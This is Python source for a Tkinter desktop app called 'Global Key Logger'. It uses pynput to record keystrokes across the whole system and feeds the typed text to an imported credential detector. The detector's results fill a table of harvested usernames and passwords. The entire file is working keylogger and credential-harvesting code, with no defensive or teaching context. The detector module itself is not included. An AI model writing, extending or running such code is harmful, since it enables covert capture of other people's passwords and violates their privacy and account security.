import tkinter as tk
from tkinter import ttk
from credential_detection import CredentialDetector
from pynput import keyboard  # Integrated global keyboard hooks


class KeyloggerGUI:
    """Desktop interface for global keyboard monitoring."""

    def __init__(self, root):
        """Initialise the application window and interface."""
        self.root = root
        self.logging_active = False
        self.listener = None  # Replaced key_binding_id with a thread listener reference
        self.keystroke_count = 0
        self.captured_text = ""
        self.credential_detector = CredentialDetector()
        self.detected_logins = set()

        self.root.title("Global Key Logger")
        self.root.geometry("1000x650")
        self.root.minsize(800, 500)

        self.build_interface()

        self.root.protocol(
            "WM_DELETE_WINDOW",
            self.close_application
        )

    def build_interface(self):
        """Build the main application interface."""
        header = ttk.Frame(
            self.root,
            padding=10
        )
        header.pack(fill=tk.X)

        title = ttk.Label(
            header,
            text="Global Key Logger",
            font=("Segoe UI", 18, "bold")
        )
        title.pack(side=tk.LEFT)

        self.clear_button = ttk.Button(
            header,
            text="Clear Capture",
            command=self.clear_capture
        )
        self.clear_button.pack(side=tk.RIGHT)

        self.stop_button = ttk.Button(
            header,
            text="Stop Logging",
            command=self.stop_logging,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.RIGHT, padx=5)

        self.start_button = ttk.Button(
            header,
            text="Start Logging",
            command=self.start_logging
        )
        self.start_button.pack(side=tk.RIGHT)

        status_frame = ttk.Frame(
            self.root,
            padding=(10, 0, 10, 10)
        )
        status_frame.pack(fill=tk.X)

        self.status_label = ttk.Label(
            status_frame,
            text="Status: Stopped"
        )
        self.status_label.pack(side=tk.LEFT)

        self.key_count_label = ttk.Label(
            status_frame,
            text="Keystrokes: 0"
        )
        self.key_count_label.pack(side=tk.LEFT, padx=25)

        self.login_count_label = ttk.Label(
            status_frame,
            text="Suspected logins: 0"
        )
        self.login_count_label.pack(side=tk.LEFT)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(
            fill=tk.BOTH,
            expand=True,
            padx=10,
            pady=(0, 10)
        )

        self.build_keystroke_tab()
        self.build_login_tab()

    def build_keystroke_tab(self):
        """Create the keystroke log table and test input."""
        frame = ttk.Frame(
            self.notebook,
            padding=5
        )

        self.notebook.add(
            frame,
            text="Keystroke Log"
        )

        instruction = ttk.Label(
            frame,
            text="Start logging, then type globally across your system to capture keyboard input."
        )

        instruction.grid(
            row=0,
            column=0,
            columnspan=2,
            sticky="w",
            pady=(0, 5)
        )

        self.capture_entry = ttk.Entry(frame)
        self.capture_entry.grid(
            row=1,
            column=0,
            columnspan=2,
            sticky="ew",
            pady=(0, 10)
        )

        columns = ("key",)

        self.keystroke_tree = ttk.Treeview(
            frame,
            columns=columns,
            show="headings"
        )

        self.keystroke_tree.heading(
            "key",
            text="Keystroke"
        )

        self.keystroke_tree.column(
            "key",
            width=700,
            anchor=tk.W
        )

        scrollbar = ttk.Scrollbar(
            frame,
            orient=tk.VERTICAL,
            command=self.keystroke_tree.yview
        )

        self.keystroke_tree.configure(
            yscrollcommand=scrollbar.set
        )

        self.keystroke_tree.grid(
            row=2,
            column=0,
            sticky="nsew"
        )

        scrollbar.grid(
            row=2,
            column=1,
            sticky="ns"
        )

        frame.rowconfigure(2, weight=1)
        frame.columnconfigure(0, weight=1)

    def build_login_tab(self):
        """Create the suspected login table."""
        frame = ttk.Frame(
            self.notebook,
            padding=5
        )

        self.notebook.add(
            frame,
            text="Suspected Logins"
        )

        columns = ("username", "password")

        self.login_tree = ttk.Treeview(
            frame,
            columns=columns,
            show="headings"
        )

        self.login_tree.heading("username", text="Username")
        self.login_tree.heading("password", text="Password")

        self.login_tree.column("username", width=350, anchor=tk.W)
        self.login_tree.column("password", width=350, anchor=tk.W)

        scrollbar = ttk.Scrollbar(
            frame,
            orient=tk.VERTICAL,
            command=self.login_tree.yview
        )

        self.login_tree.configure(
            yscrollcommand=scrollbar.set
        )

        self.login_tree.grid(
            row=0,
            column=0,
            sticky="nsew"
        )

        scrollbar.grid(
            row=0,
            column=1,
            sticky="ns"
        )

        frame.rowconfigure(0, weight=1)
        frame.columnconfigure(0, weight=1)

    def start_logging(self):
        """Start capturing keyboard input globally across the system."""
        if self.logging_active:
            return

        self.logging_active = True
        
        # Initialise and start the non-blocking background listener thread
        self.listener = keyboard.Listener(on_press=self.handle_pynput_keypress)
        self.listener.start()

        self.status_label.config(text="Status: Logging (Global)")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_logging(self):
        """Stop capturing keyboard input."""
        if self.listener is not None:
            self.listener.stop()  # Safely stop the background thread loop
            self.listener = None

        self.logging_active = False
        self.status_label.config(text="Status: Stopped")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def handle_pynput_keypress(self, key):
        """Bridge background thread pynput events to the Tkinter thread context safely."""
        if not self.logging_active:
            return

        # Explicitly forward the event via root.after to keep updates inside Tkinter's core thread
        self.root.after(0, self.process_keypress_event, key)

    def process_keypress_event(self, key):
        """Process a keyboard event and refresh the GUI elements."""
        formatted_key, is_backspace, is_return = self.format_pynput_key(key)

        if is_backspace:
            self.captured_text = self.captured_text[:-1]
        elif is_return:
            self.captured_text += " "
            self.update_suspected_logins()
        elif hasattr(key, 'char') and key.char is not None:
            self.captured_text += key.char

        if len(self.captured_text) > 500:
            self.captured_text = self.captured_text[-500:]

        self.keystroke_tree.insert("", tk.END, values=(formatted_key,))
        self.keystroke_tree.yview_moveto(1)
        
        self.keystroke_count += 1
        self.key_count_label.config(text=f"Keystrokes: {self.keystroke_count}")

    def format_pynput_key(self, key):
        """Helper to format pynput key types into human-readable strings and signals."""
        try:
            if key.char is not None:
                return str(key.char), False, False
        except AttributeError:
            pass

        if key == keyboard.Key.backspace:
            return "BackSpace", True, False
        elif key == keyboard.Key.enter:
            return "Return", False, True
        elif key == keyboard.Key.space:
            return "Space", False, False
            
        return str(key).replace("Key.", ""), False, False

    def update_suspected_logins(self):
        """Send internal logs into the detector module and update credentials display."""
        results = self.credential_detector.find_logins(self.captured_text)
        if results:
            for candidate in results:
                username = candidate.username
                password = candidate.password
                login_pair = (username, password)
                if login_pair not in self.detected_logins:
                    self.detected_logins.add(login_pair)
                    self.login_tree.insert("", tk.END, values=login_pair)
            
            self.login_count_label.config(
                text=f"Suspected logins: {len(self.detected_logins)}"
            )

    def clear_capture(self):
        """Reset internal metrics logs and clear user interface grids."""
        self.keystroke_count = 0
        self.captured_text = ""
        self.detected_logins.clear()
        
        for item in self.keystroke_tree.get_children():
            self.keystroke_tree.delete(item)
        for item in self.login_tree.get_children():
            self.login_tree.delete(item)
            
        self.key_count_label.config(text="Keystrokes: 0")
        self.login_count_label.config(text="Suspected logins: 0")
        self.capture_entry.delete(0, tk.END)

    def close_application(self):
        """Close the application window."""
        self.stop_logging()
        self.root.destroy()


def main():
    """Launch the desktop application."""
    root = tk.Tk()
    KeyloggerGUI(root)
    root.mainloop()


